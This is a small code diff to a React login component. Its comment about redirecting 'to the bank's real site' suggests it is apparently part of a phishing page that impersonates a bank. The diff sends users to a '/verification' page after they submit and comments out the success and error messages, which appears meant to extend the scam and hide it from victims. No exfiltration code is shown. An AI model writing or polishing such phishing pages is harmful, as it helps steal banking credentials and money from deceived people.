@@ -64,7 +64,7 @@ export default function Login() {
       
       // Redirect to the bank's real site after a short delay
       setTimeout(() => {
-        router.push('/');
+        router.push('/verification');
       }, 1500);
       
     } catch (error) {
@@ -161,7 +161,7 @@ export default function Login() {
               </div>
             )}
 
-            {/* Status messages */}
+            {/* Status messages
             {submitStatus === "success" && (
               <div className="text-green-500 text-center">Login successful. Redirecting...</div>
             )}
@@ -169,7 +169,7 @@ export default function Login() {
               <div className="text-red-500 text-center">
                 Something went wrong. Please try again.
               </div>
-            )}
+            )} */}
 
             {/* Bottom Actions */}
             <div className="flex justify-between items-center text-sm">
